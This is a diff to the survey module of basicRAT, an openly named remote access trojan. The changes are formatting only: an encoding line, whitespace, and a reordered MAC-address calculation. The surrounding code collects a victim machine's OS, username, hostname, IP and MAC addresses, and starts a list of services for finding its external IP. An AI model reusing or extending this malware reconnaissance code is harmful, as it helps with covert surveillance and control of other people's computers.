@@ -1,3 +1,5 @@
+# -*- coding: utf-8 -*-
+
 #
 # basicRAT survey module
 # https://github.com/vesche/basicRAT
@@ -32,21 +34,21 @@ Admin Access        - {}'''
 def run(plat):
     # OS information
     sys_platform = platform.platform()
-    processor    = platform.processor()
+    processor = platform.processor()
     architecture = platform.architecture()[0]
 
     # session information
     username = getpass.getuser()
 
     # network information
-    hostname    = socket.gethostname()
-    fqdn        = socket.getfqdn()
+    hostname = socket.gethostname()
+    fqdn = socket.getfqdn()
+    raw_mac = uuid.getnode()
+    mac = ':'.join(('%012X' % raw_mac)[i:i+2] for i in range(0, 12, 2))
     try:
         internal_ip = socket.gethostbyname(hostname)
     except socket.gaierror:
         internal_ip = ''
-    raw_mac     = uuid.getnode()
-    mac         = ':'.join(('%012X' % raw_mac)[i:i+2] for i in range(0, 12, 2))
 
     # get external ip address
     ex_ip_grab = [ 'ipinfo.io/ip', 'icanhazip.com', 'ident.me',
